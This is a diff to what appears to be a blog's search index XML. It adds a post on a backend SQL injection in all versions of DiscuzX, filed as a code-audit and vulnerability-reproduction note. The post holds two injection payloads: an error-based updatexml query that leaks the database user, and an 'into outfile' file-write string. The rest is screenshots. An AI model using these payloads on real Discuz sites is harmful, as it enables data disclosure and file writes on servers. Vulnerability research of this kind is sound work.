@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>DiscuzX全版本后台sql注入</title>
+      <link href="/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"/>
+      <url>/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre><code class="angularjs">1&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); -- -</code></pre><h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><pre><code class="angularjs">1&#39; into outfile &#39;1.txt&#39;; -- -</code></pre><p><img src="../../../../img/dz1.png" alt=""></p><p><img src="../../../../img/dz2.png" alt=""><br><img src="../../../../img/dz3.png" alt=""><br><img src="../../../../img/dz4.png" alt=""><br><img src="../../../../img/dz5.png" alt=""><br><img src="../../../../img/dz6.png" alt=""><br><img src="../../../../img/dz7.png" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ROP - CTFwiki</title>
       <link href="/2019/11/26/ROP-CTFwiki/"/>
       <url>/2019/11/26/ROP-CTFwiki/</url>
